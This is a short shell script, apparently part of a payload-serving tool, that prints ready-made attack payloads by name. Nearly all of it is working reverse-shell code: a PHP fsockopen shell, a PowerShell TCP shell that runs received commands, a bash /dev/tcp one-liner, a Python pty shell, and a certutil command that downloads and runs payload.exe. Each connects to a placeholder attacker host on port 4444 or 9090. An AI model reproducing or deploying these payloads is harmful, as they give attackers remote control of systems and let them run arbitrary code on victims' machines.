# ── Payload templates ───────────────────────────────────────────────────────
# Usage: called from serve.sh resolve_payload()
# Prints payload content to stdout or returns empty string if unknown

name="${1:-}"

case "$name" in
  php-reverse-shell)
    cat <<'EOF'
<?php
set_time_limit(0);
$ip = 'CHANGE_ME';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
EOF
    ;;

  powershell-reverse)
    echo '$client = New-Object System.Net.Sockets.TCPClient("CHANGE_ME",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
    ;;

  certutil-download)
    cat <<'EOF'
certutil -urlcache -split -f http://CHANGE_ME:9090/payload.exe C:\Windows\Temp\payload.exe && C:\Windows\Temp\payload.exe
EOF
    ;;

  linux-reverse)
    echo 'bash -i >& /dev/tcp/CHANGE_ME/4444 0>&1'
    ;;

  python-reverse)
    cat <<'EOF'
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("CHANGE_ME",4444))
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)
import pty; pty.spawn("bash")
EOF
    ;;

  *)
    exit 1
    ;;
esac
exit 0